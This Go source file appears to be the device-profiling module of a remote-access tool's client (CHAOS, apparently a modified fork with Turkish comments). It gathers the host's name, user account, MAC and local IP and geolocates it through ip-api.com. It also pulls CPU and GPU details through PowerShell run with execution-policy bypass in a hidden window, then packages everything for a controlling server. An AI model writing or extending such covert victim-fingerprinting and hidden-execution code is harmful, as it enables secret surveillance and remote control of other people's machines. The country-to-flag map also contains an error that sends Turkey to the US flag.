package information

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/entities"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
	"golang.org/x/sys/windows/registry"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"strings"
)

const (
	ERROR_SUCCESS       = 0
	STATUS_SUCCESS      = 0
	ERROR_NOT_SUPPORTED = 50
)

type MEMORYSTATUSEX struct {
	DwLength                uint32
	DwMemoryLoad            uint32
	UllTotalPhys            uint64
	UllAvailPhys            uint64
	UllTotalPage            uint64
	UllAvailPage            uint64
	UllTotalVirtual         uint64
	UllAvailVirtual         uint64
	UllAvailExtendedVirtual uint64
}

var (
	modkernel32              = syscall.NewLazyDLL("kernel32.dll")
	procGlobalMemoryStatusEx = modkernel32.NewProc("GlobalMemoryStatusEx")
)

type Service struct {
	ServerPort string
}

func NewService(serverPort string) services.Information {
	return &Service{ServerPort: serverPort}
}

func (i Service) LoadDeviceSpecs() (*entities.Device, error) {

	countryFlagMap := map[string]string{
		"AD": "ad_64.png",
		"AE": "ae_64.png",
		"AF": "af_64.png",
		"AG": "ag_64.png",
		"AI": "ai_64.png",
		"AL": "al_64.png",
		"AM": "am_64.png",
		"AO": "ao_64.png",
		"AQ": "aq_64.png",
		"AR": "ar_64.png",
		"AS": "as_64.png",
		"AT": "at_64.png",
		"AU": "au_64.png",
		"AW": "aw_64.png",
		"AX": "ax_64.png",
		"AZ": "az_64.png",
		"BA": "ba_64.png",
		"BB": "bb_64.png",
		"BD": "bd_64.png",
		"BE": "be_64.png",
		"BF": "bf_64.png",
		"BG": "bg_64.png",
		"BH": "bh_64.png",
		"BI": "bi_64.png",
		"BJ": "bj_64.png",
		"BM": "bm_64.png",
		"BN": "bn_64.png",
		"BO": "bo_64.png",
		"BQ": "bq_64.png",
		"BR": "br_64.png",
		"BS": "bs_64.png",
		"BT": "bt_64.png",
		"BV": "bv_64.png",
		"BW": "bw_64.png",
		"BY": "by_64.png",
		"BZ": "bz_64.png",
		"CA": "ca_64.png",
		"CC": "cc_64.png",
		"CD": "cd_64.png",
		"CF": "cf_64.png",
		"CG": "cg_64.png",
		"CH": "ch_64.png",
		"CI": "ci_64.png",
		"CK": "ck_64.png",
		"CL": "cl_64.png",
		"CM": "cm_64.png",
		"CN": "cn_64.png",
		"CO": "co_64.png",
		"CR": "cr_64.png",
		"CU": "cu_64.png",
		"CV": "cv_64.png",
		"CW": "cw_64.png",
		"CX": "cx_64.png",
		"CY": "cy_64.png",
		"CZ": "cz_64.png",
		"DE": "de_64.png",
		"DJ": "dj_64.png",
		"DK": "dk_64.png",
		"DM": "dm_64.png",
		"DO": "do_64.png",
		"DZ": "dz_64.png",
		"EC": "ec_64.png",
		"EE": "ee_64.png",
		"EG": "eg_64.png",
		"EH": "eh_64.png",
		"ER": "er_64.png",
		"ES": "es_64.png",
		"ET": "et_64.png",
		"FI": "fi_64.png",
		"FJ": "fj_64.png",
		"FK": "fk_64.png",
		"FM": "fm_64.png",
		"FO": "fo_64.png",
		"FR": "fr_64.png",
		"GA": "ga_64.png",
		"GB": "gb_64.png",
		"GD": "gd_64.png",
		"GE": "ge_64.png",
		"GF": "gf_64.png",
		"GG": "gg_64.png",
		"GH": "gh_64.png",
		"GI": "gi_64.png",
		"GL": "gl_64.png",
		"GM": "gm_64.png",
		"GN": "gn_64.png",
		"GP": "gp_64.png",
		"GQ": "gq_64.png",
		"GR": "gr_64.png",
		"GS": "gs_64.png",
		"GT": "gt_64.png",
		"GU": "gu_64.png",
		"GW": "gw_64.png",
		"GY": "gy_64.png",
		"HK": "hk_64.png",
		"HM": "hm_64.png",
		"HN": "hn_64.png",
		"HR": "hr_64.png",
		"HT": "ht_64.png",
		"HU": "hu_64.png",
		"ID": "id_64.png",
		"IE": "ie_64.png",
		"IL": "il_64.png",
		"IM": "im_64.png",
		"IN": "in_64.png",
		"IO": "io_64.png",
		"IQ": "iq_64.png",
		"IR": "ir_64.png",
		"IS": "is_64.png",
		"IT": "it_64.png",
		"JE": "je_64.png",
		"JM": "jm_64.png",
		"JO": "jo_64.png",
		"JP": "jp_64.png",
		"KE": "ke_64.png",
		"KG": "kg_64.png",
		"KH": "kh_64.png",
		"KI": "ki_64.png",
		"KM": "km_64.png",
		"KN": "kn_64.png",
		"KP": "kp_64.png",
		"KR": "kr_64.png",
		"KW": "kw_64.png",
		"KY": "ky_64.png",
		"KZ": "kz_64.png",
		"LA": "la_64.png",
		"LB": "lb_64.png",
		"LC": "lc_64.png",
		"LI": "li_64.png",
		"LK": "lk_64.png",
		"LR": "lr_64.png",
		"LS": "ls_64.png",
		"LT": "lt_64.png",
		"LU": "lu_64.png",
		"LV": "lv_64.png",
		"LY": "ly_64.png",
		"MA": "ma_64.png",
		"MC": "mc_64.png",
		"MD": "md_64.png",
		"ME": "me_64.png",
		"MF": "mf_64.png",
		"MG": "mg_64.png",
		"MH": "mh_64.png",
		"MK": "mk_64.png",
		"ML": "ml_64.png",
		"MM": "mm_64.png",
		"MN": "mn_64.png",
		"MO": "mo_64.png",
		"MP": "mp_64.png",
		"MQ": "mq_64.png",
		"MR": "mr_64.png",
		"MS": "ms_64.png",
		"MT": "mt_64.png",
		"MU": "mu_64.png",
		"MV": "mv_64.png",
		"MW": "mw_64.png",
		"MX": "mx_64.png",
		"MY": "my_64.png",
		"MZ": "mz_64.png",
		"NA": "na_64.png",
		"NC": "nc_64.png",
		"NE": "ne_64.png",
		"NF": "nf_64.png",
		"NG": "ng_64.png",
		"NI": "ni_64.png",
		"NL": "nl_64.png",
		"NO": "no_64.png",
		"NP": "np_64.png",
		"NR": "nr_64.png",
		"NU": "nu_64.png",
		"NZ": "nz_64.png",
		"OM": "om_64.png",
		"PA": "pa_64.png",
		"PE": "pe_64.png",
		"PF": "pf_64.png",
		"PG": "pg_64.png",
		"PH": "ph_64.png",
		"PK": "pk_64.png",
		"PL": "pl_64.png",
		"PM": "pm_64.png",
		"PN": "pn_64.png",
		"PR": "pr_64.png",
		"PS": "ps_64.png",
		"PT": "pt_64.png",
		"PW": "pw_64.png",
		"PY": "py_64.png",
		"QA": "qa_64.png",
		"RE": "re_64.png",
		"RO": "ro_64.png",
		"RS": "rs_64.png",
		"RU": "ru_64.png",
		"RW": "rw_64.png",
		"SA": "sa_64.png",
		"SB": "sb_64.png",
		"SC": "sc_64.png",
		"SD": "sd_64.png",
		"SE": "se_64.png",
		"SG": "sg_64.png",
		"SH": "sh_64.png",
		"SI": "si_64.png",
		"SJ": "sj_64.png",
		"SK": "sk_64.png",
		"SL": "sl_64.png",
		"SM": "sm_64.png",
		"SN": "sn_64.png",
		"SO": "so_64.png",
		"SR": "sr_64.png",
		"SS": "ss_64.png",
		"ST": "st_64.png",
		"SV": "sv_64.png",
		"SX": "sx_64.png",
		"SY": "sy_64.png",
		"SZ": "sz_64.png",
		"TC": "tc_64.png",
		"TD": "td_64.png",
		"TF": "tf_64.png",
		"TG": "tg_64.png",
		"TH": "th_64.png",
		"TJ": "tj_64.png",
		"TK": "tk_64.png",
		"TL": "tl_64.png",
		"TM": "tm_64.png",
		"TN": "tn_64.png",
		"TO": "to_64.png",
		"TR": "us_64.png",
		"TT": "tt_64.png",
		"TV": "tv_64.png",
		"TW": "tw_64.png",
		"TZ": "tz_64.png",
		"UA": "ua_64.png",
		"UG": "ug_64.png",
		"UM": "um_64.png",
		"US": "us_64.png",
		"UY": "uy_64.png",
		"UZ": "uz_64.png",
		"VA": "va_64.png",
		"VC": "vc_64.png",
		"VE": "ve_64.png",
		"VG": "vg_64.png",
		"VI": "vi_64.png",
		"VN": "vn_64.png",
		"VU": "vu_64.png",
		"WF": "wf_64.png",
		"WS": "ws_64.png",
		"YE": "ye_64.png",
		"YT": "yt_64.png",
		"ZA": "za_64.png",
		"ZM": "zm_64.png",
		"ZW": "zw_64.png",
	}

	resp, err := http.Get("http://ip-api.com/json")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var data map[string]interface{}
	err = json.NewDecoder(resp.Body).Decode(&data)
	if err != nil {
		return nil, err
	}

	countryCode, ok := data["countryCode"].(string)
	if !ok {
		return nil, errors.New("failed to get country code from API response")
	}

	hostname, err := os.Hostname()
	if err != nil {
		return nil, err
	}
	username, err := user.Current()
	if err != nil {
		return nil, err
	}
	macAddress, err := network.GetMacAddress()
	if err != nil {
		return nil, err
	}
	localIP, err := network.GetLocalIP()
	if err != nil {
		return nil, err
	}

	ramSize, err := getRAMSize()
	if err != nil {
		log.Fatal("Error getting RAM size:", err)
	}

	gpuInfo, err := getGPUInfo()
	if err != nil {
		log.Printf("Error getting GPU info: %v", err)
	}

	cpuInfo, err := getCPUInfo()
	if err != nil {
		log.Fatal("Error getting CPU info:", err)
	}

	// countryCode haritasındaki anahtarları kullanarak bayrak dosyasının adını alın
	flagFileName, ok := countryFlagMap[countryCode]
	if !ok {
		flagFileName = "unknown_flag.png" // Eğer ülke kodu eşleşmezse, bilinmeyen bayrak adını varsayılan olarak ayarlayın.
	}

	device := &entities.Device{
		Hostname:       hostname,
		Username:       username.Name,
		UserID:         username.Username,
		OSName:         OSName(),
		OSArch:         runtime.GOARCH,
		MacAddress:     macAddress,
		LocalIPAddress: localIP,
		Port:           i.ServerPort,
		FetchedUnix:    time.Now().UTC().Unix(),
		CountryCode:    countryCode,
		FlagImage:      flagFileName, // Eklenen bayrak dosyasının adını ayarlayın.
		RAMSize:        ramSize,      // Eklenen RAM boyutunu ayarlayın.
		GPU:            gpuInfo,      // Eklenen GPU bilgisini ayarlayın.
		CPU:            cpuInfo,      // Eklenen CPU bilgisini ayarlayın.

	}

	return device, nil
}

func getRAMSize() (string, error) {
	var memoryStatus MEMORYSTATUSEX
	memoryStatus.DwLength = uint32(unsafe.Sizeof(memoryStatus))
	ret, _, err := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memoryStatus)))

	if ret == 0 {
		if err.(syscall.Errno) != ERROR_SUCCESS {
			return "", err
		}
		return "", fmt.Errorf("GlobalMemoryStatusEx failed with error code: %d", ret)
	}

	ramSizeGB := float64(memoryStatus.UllTotalPhys) / (1024 * 1024 * 1024)
	return fmt.Sprintf("%.1f GB", ramSizeGB), nil
}

func runHiddenCommandContext(ctx context.Context, command string) (string, error) {
	ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "cmd", "/C", "start", "/b", "powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // Pencere görünümünü gizle
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("error running command: %v\n%s", err, output)
	}

	return strings.TrimSpace(string(output)), nil
}

func getGPUInfo() (string, error) {
	command := `Get-WmiObject -Class Win32_VideoController | Select-Object -ExpandProperty Description`
	return runHiddenCommandContext(context.Background(), command)
}

func getCPUInfo() (string, error) {
	command := `Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name`
	return runHiddenCommandContext(context.Background(), command)
}

func OSName() string {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	if err != nil {
		log.Printf("Error opening reg key to get OS name: %s", err)
		return ""
	}
	defer k.Close()

	pn, _, err := k.GetStringValue("ProductName")
	if err != nil {
		log.Printf("Error reading ProductName: %s", err)
		return ""
	}
	return pn
}
